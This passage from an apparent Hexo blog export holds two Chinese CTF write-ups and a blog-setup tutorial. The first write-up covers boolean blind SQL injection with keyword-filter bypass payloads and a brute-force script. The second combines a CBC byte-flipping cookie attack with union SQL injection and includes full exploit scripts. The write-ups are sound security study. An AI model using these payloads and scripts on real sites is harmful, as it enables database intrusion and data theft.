    <content type="text"><![CDATA[题目来源题目链接题目界面比较简单，只让你输入id，输对了告诉你 You are in，输错了就 You are not in可以想到这是一个盲注，经简单测试，提交字母a进不去，1可以。也就是说通过注入如果进去了，说明注入的语句成功执行，反之没有执行，典型的bool盲注bool盲注的一般思路参考链接一般来说，bool盲注通常是通过一位一位爆破字符来实现的，常用的函数如下：1234567891011121314151617Length()函数 返回字符串的长度Substr() 截取字符串SUBSTRING(str,pos,len)SUBSTRING(str FROM pos FOR len)SUBSTRING(str,pos)SUBSTRING(str FROM pos) ****划重点****mid(column_name,start[,length]) 类似substrleft(str, length) 从左开始截取字符串right(str, length)ascii() 返回字符串str的最左面字符的ASCII代码值ord() 类似ascii，返回字符串第一个字符的ASCII 值ELT(n,str1,str2,str3,...) 如果n=1，则返回str1,如果n=2，则返回str2,依次类推，没用过concat() 字符串连接group_concat()解题思路首先fuzz一波，发现1234可用payload： id=a&apos;+or+&apos;1 in id=a&apos;+or+&apos;1&apos;=&apos;2 not in id=a&apos;+or+(select+1)=&apos;1 in很多东西被过滤了，比如：1空格 and || 井号 逗号 substr（逗号都能过滤，wc）而且经过测试发现不是说没被过滤（就是说界面没弹出SQL注入警告）你的语句就能正常执行了，下面我会说到，明明本地执行很成功，而且没有报警告，但就是没有效果、、、、经过多次尝试，发现数据库长度这个可以搞：1id=a'+or+(select+(length(database()))&gt;10)='1 #提示是in 经过测试，数据库名长度为18接下来不出意外就是常规的bool盲注思路了，首先我用的是regexp注入，主要考虑的是substr被过滤了，下面是payload：1id=a'+or+(select+database()+regexp+'a[a-z0-9A-Z_]')='1结果执行不了（本地是可以执行的）回过头考虑 substr，因为逗号被过滤了，找了半天百度才发现可以用from替代，substr被过滤，mid可用，于是有以下payload1id=a'+or+(select+ascii(mid(database()+from+1))&gt;64)='1但还是GG了，上面无法执行，原因是空格被过滤了，换一种1id=a+or+(select(ascii(mid(database()from(2)for(1)))=109))='1看起来比较吊了吧，还是不行(•́へ•́╬)换一换 ——&gt;1id=a'+or+(select(mid(database()from(1))&gt;'0'))='1 #可用(加上for(1)就不行，无语了)这样也行1id=a'+or+(select(ascii(mid(database()from(1)))&gt;ascii('W')))='1个人觉得可能是空格问题，有的语句空格不能用加号替代，语句会有语法错误，但是又要区分出层次，于是就用 括号 绕过了下面是爆破数据库名的脚本，跑完数据库名为—-&gt;ctf_sql_bool_blind：123456789101112131415161718192021import requestsurl = 'http://ctf5.shiyanbar.com/web/earnest/index.php'def get_flag(payload): data=&#123;&#125; data['submit']='submit' data['id']=payload r = requests.post(url,data) if('You are not in' in r.content): print payload return 1char = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'char = list(char)for i in range(1,19): #print i for j in char: payload="a\'+or+(select(ascii(mid(database()from("+str(i)+")))&gt;ascii(\'"+j+"\')))=\'1" if(get_flag(payload)): break又见套路接下来爆破表名，又要面对一个问题，即limit 0,1 中的空格和逗号问题，逗号可以绕过，但是空格加括号就不管用了。下面是测试的payload12id=a'+or+(select(ascii(mid((select table_name from information_schema.tableswhere table_schema='ctf_sql_bool_blind' limit 1 offset 0)from(1)))&gt;ascii('a'))='1别的地方的空格可以用括号绕过去，但是limit那里是无论如何也不行，比如编码，tab制表符，%09，%0a都不行只能换姿势了12id=a'+or+(select(ascii(mid((select(table_name)from(information_schema.tables)where(table_schema='ctf_sql_bool_blind')&amp;&amp;(table_name)regexp('[a-z]$'))from(1)))&gt;ascii('0')))='1首先正则表达式匹配方式上从前往后匹配 ^ 这个符号被过滤了，所以考虑 $ 从后往前匹配。但是还是不行。后来看了大佬的wp，没看太明白，但是有一点，题目不仅黑名单过滤了一些关键字，还对一些字符进行了替换。比如or和星号。（之前用/**/代替空格一直不行，原来原因在这）那么这就要从审视一下之前用的payload了最先用的 id=a’+or+’1 中or被替换后就变为了 id=a’++’1 ，那为什么也是in呢？经过本地测试，这句话确实是可以执行的。比如1select * from user where username='a'++'admin'参数a是假的，但是admin是存在的话，就可以成功查询（具体语法还未深究）。所以上面的参数 id=a’++’1 中参数1 是确实可以查到的，因此显示you are in .同时这也提醒我了加号貌似并能代替空格（不知道什么时候形成的误区），之前还奇怪为什么在本地执行时用加号替换空格不行呢，原因应该就是这了，二者不是可等价代换的。最多是某些特殊情况或位置或许有效。接下来看我们爆破数据库名的payload是怎么成功执行的1id=a'+or+(select+(length(database()))&gt;10)='1首先本地测试下面这个payload：123select * from user where username='a'+or+(select+(length(database()))&gt;10)='1'---&gt; #1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or+(select+(length(database()))&gt;10)='1' LIMIT 0, 30' at line 1带or是错误的。去掉or成功执行。爆破数据库名的payload也是这个原理,sql执行的实际都是没有or的语句，而碰巧的是两个加号可以正常执行:1id=a'+or+(select(ascii(mid(database()from(1)))&gt;ascii('W')))='1那么非要用or呢，首先是绕过空格，其次是or被替换，因此有以下payload：1id=a'%09oorr%09(select(ascii(mid(database()from(1)))&gt;ascii('W')))='1成功执行，效果和+or+一样。这样就可以解释前面一个悬案了，就是这个payload：1id=a'+or+(select(ascii(mid(database()from(2)for(1)))=109))='1这也是爆破数据库名字的，但是mid函数里加了for(1)就不行，去了for反而可以。这就可以解释了，for里的or被替换为空了，导致语句出错，自然就不行了。可以考虑这样绕过：123id=a'+or+(select(ascii(mid(database()from(2)foorr(1)))=109))='1或id=a'%09oorr%09(select(ascii(mid(database()from(2)foorr(1)))=109))='1知道错误原因就好办了，我们看之前一直执行不成功的payload：12id=a'+or+(select(ascii(mid((select(table_name)from(information_schema.tables)where(table_schema='ctf_sql_bool_blind')limit 1 offset 0)from(1)))&gt;ascii('a')))='1首先空格用%09替换，此外容易忽视的information_schema中有or，因此要变为infoorrmation_schema. 可以看下面改造后的：12id=a'%09oorr%09(select(ascii(mid((select(table_name)from(infoorrmation_schema.tables)where(table_schema='ctf_sql_bool_blind')limit%091%09offset%090)from(1)))&gt;ascii('a')))='1提示You are in。wccccccccccccccccccc，内牛满面o(╥﹏╥)o。每次改变from(1)里面的值但是在用脚本时，可能是由于payload里的百分号解析问题，提交后服务器一直提示sql注入。所以换了工具，用burp的爆破模式，把position设为ascii(‘a’)中的a，字典在本地txt里编一个，a-z的字母和一些数字符号等。还有要注意的是burp抓包时最好是抓hackbar提交的包，那样post的内容就不会被编码了最后爆出表名：fiag再暴字段：12id=a'%09oorr%09(select(ascii(mid((select(column_name)from(infoorrmation_schema.columns)where(table_name='fiag')limit%091%09offset%090)from(1)))=ascii('§a§')))='1]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>WAF</tag>
        <tag>实验吧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20180815）:字节翻转攻击与sql注入拿flag]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820180815%EF%BC%89%EF%BC%9A%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E6%8B%BFflag%2F</url>
    <content type="text"><![CDATA[题目来源题目链接该题目的出发点是通过注入拿到flag，sql注入结果的回显是在show_homepage函数里，上溯使该回显生效需要满足以下几个条件：首先存在cipher和iv两个cookie值变量$plain可以通过openssl解密解密后的结果能够组成恶意SQL查询语句（如把 ++$info[‘id’]++ 后面的 ++”,0”;++ 注释掉剩下就是构造sql查询的问题了 主要问题就在2、3上面。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpdefine("SECRET_KEY", '***********');define("METHOD", "aes-128-cbc");error_reporting(0);include('conn.php');function sqliCheck($str)&#123; if(preg_match("/\\\|,|-|#|=|~|union|like|procedure/i",$str))&#123; return 1; &#125; return 0;&#125;function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function show_homepage()&#123; global $link; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); //info[id]为plain反序列化结果，plain可以正确解密 $sql="select * from users limit ".$info['id'].",0"; //info['id']处可以注入，往上寻找来源 $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link)))&#123; $rows=mysqli_fetch_array($result); echo '&lt;h1&gt;&lt;center&gt;Hello!'.$rows['username'].'&lt;/center&gt;&lt;/h1&gt;'; &#125; else&#123; echo '&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'; &#125; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;if(isset($_POST['id']))&#123; $id = (string)$_POST['id']; //将输入转为字符串格式 if(sqliCheck($id)) //检查关键字防止sql注入 die("&lt;h1 style='color:red'&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;"); $info = array('id'=&gt;$id); login($info); //进入登陆界面并显示数据库查询信息 echo '&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;';&#125;else&#123; if(isset($_COOKIE["iv"])&amp;&amp;isset($_COOKIE['cipher']))&#123; show_homepage(); &#125;else&#123; echo '&lt;body class="login-body" style="margin:0 auto"&gt; &lt;div id="wrapper" style="margin:0 auto;width:800px;"&gt; &lt;form name="login-form" class="login-form" action="" method="post"&gt; &lt;div class="header"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;input id to login&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; &lt;input name="id" type="text" class="input id" value="id" onfocus="this.value=\'\'" /&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;p&gt;&lt;input type="submit" name="submit" value="Login" class="button" /&gt;&lt;/p&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;首先了解几个概念1. CBC全名密码分组链接，在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。下图是CBC加解密的图解：2. aes-128-cbc加解密题目中给的是aes-128-cbc，对应上面cbc的概念不难理解，这里的AES-128就是将Ciphertext以128bits为一组（8位=1字节），128bit==16Byte，意思就是明文的16字节为一组对应加密后的16字节的密文。AES的cbc模式就是用++初始向量和密钥++加密第一组数据，然后把第一组数据加密后的密文重新赋值给IV，然后进行第二组加密，循环进行直到结束（结合图片理解），最后将IV和加密后的密文拼接在一起，得到最终的密文。若最后剩余的明文不够16字节，需要进行填充，通常采用PKCS7进行填充。比如最后缺3个字节，则填充3个字节的0x03;若最后缺10个字节，则填充10个字节的0x0a;若明文正好是16个字节的整数倍，最后要再加入一个16字节0x10的组再进行加密cbc解密的话先从密文中提取出IV，然后将密文分组，然后使用密钥对第一组的密文解密，然后和IV进行xor得到明文。使用密钥对第二组密文解密，然后和2中的密文xor得到明文。重复前两个步骤，直到最后一组密文。要强调的是：分块解密时，每块产生的plaintext（明文）只与前一块的ciphertext和key有关3. 字节翻转攻击字节反转攻击的目的在于控制解密产生的明文，方法就是改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。A=ciphertext(N-1),B=plaintext(N),C为第N块待异或且经过解密的字符，C’为我们经过翻转要得到的明文。A’为修改后的密文。简单计算，我们可以得到以下关系：A = B ^ CC = A ^ BA ^ B ^ C = 0A ^ B ^ C ^ C’ = C’目的是得到C’，根据关系式可以得到 A’ = A ^ C ^ C’，让A’和B去异或得到C’测试脚本123456789101112131415161718192021222324252627282930313233&lt;?phpdefine('MY_AES_KEY', "abcdef0123456789");function aes($data, $encrypt, $iv) &#123; $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, ''); mcrypt_generic_init($aes, MY_AES_KEY, $iv); return $encrypt ? mcrypt_generic($aes, $data) : mdecrypt_generic($aes, $data);&#125;define('MY_MAC_LEN', 40);function encrypt($data, $iv) &#123; return aes($data, true, $iv);&#125;function decrypt($data, $iv) &#123; $data = rtrim(aes($data, false, $iv) , "\0"); return $data;&#125;$v = "a:2:&#123;s:4:\"name\";s:6:\"sdsdsd\";s:8:\"greeting\";s:20:\"echo 'Hello sdsdsd!'\";&#125;";echo "Plaintext before attack: $v\n";$b = array();$enc = array();$enc = @encrypt($v, "1234567891234567");echo ord($enc[15]) . PHP_EOL;$enc[15] = chr(ord($enc[15]) ^ ord("8") ^ ord("7")); //$enc[15]是指将第二个加密快第16个字节（一个字符为一个字节）也就是s的8变为7$b = @decrypt($enc, "1234567891234567");//$b为第一次解密结果，有乱码，原因是被修改的加密块无法正确恢复$iv="1234567891234567";for ($i=0;$i&lt;16;$i++) &#123; $iv[$i] = chr(ord($b[$i]) ^ ord($iv[$i]) ^ ord($v[$i])); &#125;$c = array();$c = @decrypt($enc,$iv);echo "Plaintext Third attack : $c\n";?&gt;回到题目题目中要想注入成功，必须字符末尾有#号将后面内容注释，因此要通过字节翻转攻击修改密文来达到解密后的明文最后一个字节为#经过分析源代码，我们知道密文为cookie里的cipher，原始向量为iv，经过URL编码和base64编码。构造如下脚本：12345678910111213141516171819202122232425262728293031323334353637383940414243444546# coding: utf-8import requestsimport base64from urllib import unquote,quotefrom Crypto.Cipher import AESimport reurl = 'http://ctf5.shiyanbar.com/web/jiandan/index.php'data = &#123;&#125;id = '12' #输入的值submit = 'Login'data['id']=iddata['submit']=submitr = requests.post(url,data)iv=base64.b64decode(unquote(r.cookies['iv']))cipher=list(base64.b64decode(unquote(r.cookies['cipher'])))plain_1 = "a:1:&#123;s:2:\"id\";s:"plain_2 = "2:\"12\";&#125;"cipher[4]=chr(ord(cipher[4]) ^ ord("2") ^ ord("#"))#套用公式，把字符转为ASCII码才能进行异或。4的意思是把第二块第5个字节即2变为#cipher_new = "".join(cipher)cipher_new = quote(base64.b64encode(cipher_new))cookies =dict(iv=r.cookies['iv'],cipher=cipher_new)rr = requests.get(url,cookies=cookies)#修复第一块乱码问题plain_base64=re.findall("base64_decode\(\'(.*?)\'\)",rr.content)[0] #查找结果后返回的解密值plain_base64=base64.b64decode(plain_base64)iv = list(iv)for i in range(16): iv[i] = chr(ord(plain_base64[i]) ^ ord(iv[i]) ^ ord(plain_1[i]));iv_new = "".join(iv)iv_new = quote(base64.b64encode(iv_new))cookies_2 =dict(iv=iv_new,cipher=cipher_new)rrr = requests.get(url,cookies=cookies_2)print rrr.content得到的结果：1&lt;h1&gt;&lt;center&gt;Hello!rootzz&lt;/center&gt;&lt;/h1&gt;说明有效，下一步构造注入的payload。回到题目泄露的源代码，涉及到数据库查询的一行是这个：1$sql="select * from users limit ".$info['id'].",0";要想构造成功，首先了解一下limit的用法：limitLIMIT是MySQL内置函数，其作用是用于限制查询结果的条数。其语法格式如下:LIMIT [位置偏移量,] 行数位置偏移量是指MySQL查询分析器要从哪一行开始显示，索引值从0开始，即第一条记录位置偏移量是0，第二条记录的位置偏移量是1,依此类推…，第二个参数为“行数”即指示返回的记录条数。位置偏移量可以理解为跳过前xx条记录(元组).示例1：1SELECT * FROM YourTableName LIMIT 4; #返回查询结果的前四条示例2：1SELECT * FROM YourTableName LIMIT 2,4; #从第三条起向后查询四条回到题目中，id变量后面跟了一个”,0”，这个查询语句正常输入无论如何也不会输出东西，因为查询数量是0。回到题目，代码过滤了#、union，对于#，还有一种办法可以达到，即用chr(0)替代。详见链接union可以通过字节反转攻击的方式绕过，所以形成类似以下的payload：1select * from users limit 0 2nion select * from((select 1)a join (select 2)b);'+chr(0)解释一下，limit 后面是构造的命令。limit后面跟0是为了前面的查询结果不输出，而直接将后面联合查询的结果输出（因为输出只有一行，如果变为1，会输出rootzz，即users表的第一行数据，不是我们想要的）2nion 是为了绕过对union的过滤，结合上面的代码将payload序列化，再对相应字符进行字节翻转攻击(select 1)a 和 (select 2)b 等是为了凑字段，通过不断叠加，根据报错信息判断users表的字段数，因为应用的是联合查询，前后查询的字段数必须一致，否则会爆 [Err] 1222 - The used SELECT statements have a different number of columns 错误。join相当于逗号，逗号被过滤了经过判断，有三个字段，因此有以下payload123('0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'+chr(0),7,'2','u')("0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"+chr(0),7,'2','u')("0 2nion select * from((select 1)a join (select value from you_want)b join (select 3)c);"+chr(0),6,'2','u')完整脚本：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# coding: utf-8import requestsimport base64from urllib import unquote,quotefrom Crypto.Cipher import AESimport reurl = 'http://ctf5.shiyanbar.com/web/jiandan/index.php'def find_flag(payload,index,string1,string2): data = &#123;&#125; id = payload submit = 'Login' data['id']=id data['submit']=submit r = requests.post(url,data) iv=base64.b64decode(unquote(r.cookies['iv'])) cipher=list(base64.b64decode(unquote(r.cookies['cipher']))) plain_1 = "a:1:&#123;s:2:\"id\";s:" cipher[index]=chr(ord(cipher[index]) ^ ord(string1) ^ ord(string2))#套用公式，把字符转为ASCII码才能进行异或 cipher_new = "".join(cipher) cipher_new = quote(base64.b64encode(cipher_new)) cookies =dict(iv=r.cookies['iv'],cipher=cipher_new) rr = requests.get(url,cookies=cookies) #修复第一块乱码问题 plain_base64=re.findall("base64_decode\(\'(.*?)\'\)",rr.content)[0] #查找结果后返回的解密值 plain_base64=base64.b64decode(plain_base64) iv = list(iv) for i in range(16): iv[i] = chr(ord(plain_base64[i]) ^ ord(iv[i]) ^ ord(plain_1[i])); iv_new = "".join(iv) iv_new = quote(base64.b64encode(iv_new)) cookies_2 =dict(iv=iv_new,cipher=cipher_new) rrr = requests.get(url,cookies=cookies_2) print rrr.contentfind_flag("0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"+chr(0),7,'2','u')PS：这道题服务器貌似出了点问题，一直报错]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>密码</tag>
        <tag>sql注入</tag>
        <tag>实验吧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用GitHub Pages + Hexo + atom建立自己的博客]]></title>
    <url>%2F2018%2F12%2F03%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820181202%EF%BC%89%EF%BC%9A%E4%BD%BF%E7%94%A8GitHub%20Pages%20%2B%20hexo%20%2B%20atom%E5%BB%BA%E7%AB%8B%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[Github Pages建立博客比较方便，而且有github的支持，不用管服务器什么之类的问题。下面主要就建立博客以及配置Hexo主题，用atom进行markdown编辑并发布到github.io进行介绍。0x01 Github Pages建立博客第一步：建立github账户第二步：在github上建立仓库（Repositories）建立仓库命名需要是 github用户名.github.io第三步：简单设置进入仓库，点击setting，可以看到项目的具体内容，也可以选择jekyll风格的主题，此时可以访问自己的博客了，地址就是：username.github.io0x02 Hexo主题美化自己的博客第一步：环境配置安装git，git的官方网址：https://git-scm.com/downloads安装node.js，官方网址为：http://nodejs.cn/download/测试是否成功：123git –versionnode -vnpm -v第二步：安装Hexo个人感觉Hexo比jekyll好用一点，而且据说里面的NexT主题比较强大，自定义比较丰富（还未探索）在命令行输入1npm install hexo-cli -g简单测试一下Hexo的用法：首先本地建立一个文件夹作为博客的主目录，比如叫myblog初始化该目录：hexo init 目录路径，如果在目录下进行cmd，直接hexo init就可以了初始化之后就可以看到里面的一下配置文件了（跟jeklly差不多）,config.yml是配置文件，posts是存储博客文章的文件夹本地服务器测试：hexo server看到Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.基本上就可以了，可以点击链接看一下自己博客的初始样子第三步：更换主题Hexo里面用NexT主题比较多，，使用这个主题首先要从git上下载12cd your-hexo-sitegit clone https://github.com/iissnan/hexo-theme-next themes/next这个主题保存在博客文件夹里面theme文件夹里，然后打开_config.yml站点配置文件，找到theme字段改为next就可以了。具体配置请参考这篇文章：https://blog.csdn.net/amberwu/article/details/79397909更多关于next美化的请参考这篇：https://blog.csdn.net/u011475210/article/details/79023429第四步：提交到github pages自己在__posts文件夹写好了文章或是更改了配置文件需要push到github，首先要对站点配置文件进行设置，以便连接到自己的github仓库。在_config.yml最下面找到deploy字段，配置如下：1234deploy: type: git repo: https://github.com/username/username.github.io branch: master首次部署要在命令行输入：1npm install hexo-deployer-git –save生成静态界面并提交到仓库：1hexo d -g出现INFO Deploy done: git 表示上传成功0x03 Atom编辑器快速发布博客Atom编辑器是github开发的，插件很丰富，界面比较友好（高分屏用起来也比较舒服），最重要的是免费开源，因为博客基本上md格式，下面链接介绍了如何将Atom打造成markdown编辑神器。https://www.cnblogs.com/libin-1/p/6638165.html那么怎么连接自己的github项目呢。首先点击文件–&gt;添加项目文件夹–&gt;选择自己的博客文件夹atom里安装命令行插件plateformio-ide-terminal安装markdown-preview-plus等等一系列辅助md编辑插件结合命令行插件进行md提交，整个过程不需要配置里面的github面板或者git-plus什么之类的插件，这些配置是在站点配置文件搞好的这里说明一下，可能由于markdown-preview-plus最新版本和同步滚动插件(markdown-scroll-sync)不兼容，所以可能会报错。报错的话可以安装低版本的markdown-preview-plus，这个低版本在install里好像找不到，可以通过命令行安装apm install markdown-preview-plus@2.4.16]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
</search>
